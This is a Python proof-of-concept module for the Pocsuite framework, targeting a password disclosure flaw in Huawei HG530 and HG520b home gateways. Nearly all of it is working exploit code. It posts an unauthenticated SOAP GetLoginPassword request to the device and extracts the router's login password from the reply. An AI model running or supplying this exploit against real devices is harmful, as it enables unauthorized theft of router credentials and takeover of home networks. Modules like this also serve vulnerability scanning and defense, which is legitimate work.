#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re

class TestPOC(POCBase):
    name = "Huawei HG530 & HG520b Password Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Info Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/37424/'
    desc = 'Module exploits password disclosure vulnerability in Huawei HG530 and HG520b devices.If the target is vulnerable it allows to read credentials.'


    vulDate = ''
    createDate = '2017-10-18'
    updateDate = '2017-10-18'

    appName = 'huawei'
    appVersion = 'Huawei Home Gateway HG530&G520b'
    dork = ''
    appPowerLink = 'http://www.huawei.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url+ '/UD/?5'

        headers = {'SOAPACTION': '"urn:dslforum-org:service:UserInterface:1#GetLoginPassword"',
                   'Content-Type': 'text/xml; charset="utf-8"',
                   'Expect': '100-continue'}
        data = ("<?xml version=\"1.0\"?>"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                "<s:Body>"
                "<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
                "</m:GetLoginPassword>"
                "</s:Body>"
                "</s:Envelope>")
        resp = req.post(url,headers=headers,data=data)
        password = re.search('<NewUserpassword>(.*?)</NewUserpassword>',resp.content)
        if password:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Password'] = password.group(1)

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
